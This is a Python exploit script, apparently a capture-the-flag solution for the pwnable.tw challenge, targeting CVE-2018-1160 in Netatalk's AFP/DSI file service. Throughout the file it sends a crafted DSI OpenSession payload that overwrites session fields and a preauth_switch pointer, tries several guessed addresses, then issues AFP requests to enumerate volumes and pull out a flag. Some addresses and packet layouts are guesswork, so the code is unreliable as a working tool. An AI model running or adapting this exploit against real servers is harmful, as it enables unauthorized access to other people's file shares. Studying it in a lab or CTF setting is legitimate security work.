#!/usr/bin/env python3

import socket
import struct
import sys
import time

def send_exploit(sock):
    """Send the CVE-2018-1160 exploit"""
    print("[+] Sending exploit to overwrite preauth_switch data.")
    
    # This is the actual exploit from pea.py
    data = b'\x00\x04\x00\x01\x00\x00\x00\x00'
    data += b'\x00\x00\x00\x1a\x00\x00\x00\x00'
    data += b'\x01'  # attnquant in open sess
    data += b'\x18'  # attnquant size
    data += b'\xad\xaa\xaa\xba'  # overwrites attn_quantum (on purpose)
    data += b'\xef\xbe\xad\xde'  # overwrites datasize
    data += b'\xfe\xca\x1d\xc0'  # overwrites server_quantum 
    data += b'\xce\xfa\xed\xfe'  # overwrites the server id and client id
    
    # Try different preauth_switch addresses
    preauth_addresses = [
        b'\x60\xb6\x63\x00\x00\x00\x00\x00',  # Original pea.py address
        b'\x60\xb6\x42\x00\x00\x00\x00\x00',  # Another address from pea.py
        b'\x40\x00\x00\x00\x00\x00\x00\x00',  # Common base address
        b'\x60\x00\x00\x00\x00\x00\x00\x00',  # Another common base
        b'\x20\x22\x44\x00\x00\x00\x00\x00',  # postauth_switch address
        b'\x20\x22\x45\x00\x00\x00\x00\x00',  # afp_switch address
    ]
    
    for i, addr in enumerate(preauth_addresses):
        print(f"[+] Trying preauth address {i+1}/{len(preauth_addresses)}")
        
        # Create exploit with this address
        exploit_data = data + addr
        
        # Send the exploit
        sock.sendall(exploit_data)
        time.sleep(0.2)
        
        # Test if it worked
        try:
            # Try to get server parameters
            afp_data = struct.pack('>BBHH', 0x3f, 0x07, 0x0001, 0)
            dsi_header = struct.pack('>BBHHHH', 0x00, 0x03, 0x0001, 0, len(afp_data) + 16, 0)
            packet = dsi_header + afp_data
            sock.sendall(packet)
            
            response = sock.recv(1024)
            if response and len(response) > 16:
                print(f"[+] SUCCESS! Got response: {len(response)} bytes")
                print(f"[+] Response: {response[:100]}")
                return True
                
        except Exception as e:
            print(f"[-] Failed with address {i+1}: {e}")
            continue
    
    return False

def get_volumes(sock):
    """Get list of volumes"""
    print("[+] Getting volume list...")
    
    try:
        afp_data = struct.pack('>BBHH', 0x3f, 0x09, 0x0002, 0)
        dsi_header = struct.pack('>BBHHHH', 0x00, 0x03, 0x0002, 0, len(afp_data) + 16, 0)
        packet = dsi_header + afp_data
        sock.sendall(packet)
        
        response = sock.recv(1024)
        if response and len(response) > 18:
            num_volumes = struct.unpack('>H', response[18:20])[0]
            print(f"[+] Found {num_volumes} volumes")
            return num_volumes
        else:
            print("[-] Could not get volume list")
            return 0
    except:
        print("[-] Error getting volume list")
        return 0

def enumerate_volume(sock, vol_id):
    """Enumerate files in a volume"""
    print(f"[+] Enumerating volume {vol_id}...")
    
    try:
        afp_data = struct.pack('>BBHH', 0x3f, 0x0b, 0x0003, 0)
        afp_data += struct.pack('>H', vol_id)  # Volume ID
        afp_data += struct.pack('>H', 0)  # Directory ID
        afp_data += struct.pack('>L', 1)  # Bitmap
        afp_data += struct.pack('>L', 0)  # Start index
        afp_data += struct.pack('>L', 100)  # Max items
        afp_data += struct.pack('>L', 4096)  # Max reply size
        afp_data += struct.pack('>L', 0)  # Search params
        afp_data += struct.pack('>L', 0)  # Reserved
        
        dsi_header = struct.pack('>BBHHHH', 0x00, 0x03, 0x0003, 0, len(afp_data) + 16, 0)
        packet = dsi_header + afp_data
        sock.sendall(packet)
        
        response = sock.recv(4096)
        if response:
            print(f"[+] Volume {vol_id} response: {len(response)} bytes")
            
            # Look for flag
            if b'FLAG{' in response:
                flag_start = response.find(b'FLAG{')
                flag_end = response.find(b'}', flag_start) + 1
                if flag_end > flag_start:
                    flag = response[flag_start:flag_end].decode('utf-8', errors='ignore')
                    print(f"[+] FOUND FLAG: {flag}")
                    return flag
            
            # Also check as string
            response_str = response.decode('utf-8', errors='ignore')
            if 'FLAG{' in response_str:
                flag_start = response_str.find('FLAG{')
                flag_end = response_str.find('}', flag_start) + 1
                if flag_end > flag_start:
                    flag = response_str[flag_start:flag_end]
                    print(f"[+] FOUND FLAG: {flag}")
                    return flag
            
            print(f"[+] Raw response: {response[:200]}")
        
        return None
    except Exception as e:
        print(f"[-] Error enumerating volume {vol_id}: {e}")
        return None

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 simple_pea.py <host> <port>")
        print("Example: python3 simple_pea.py chall.pwnable.tw 10002")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    print("CVE-2018-1160 Simple Pea Exploit")
    print("=" * 30)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        print(f"[+] Connected to {host}:{port}")
        
        # Send the exploit
        if send_exploit(sock):
            # Get volumes
            num_volumes = get_volumes(sock)
            
            # Enumerate each volume to find the flag
            for vol_id in range(1, num_volumes + 1):
                flag = enumerate_volume(sock, vol_id)
                if flag:
                    print(f"[+] SUCCESS! Flag found: {flag}")
                    sock.close()
                    return
            
            print("[-] No flag found in any volume")
        else:
            print("[-] Exploit failed")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()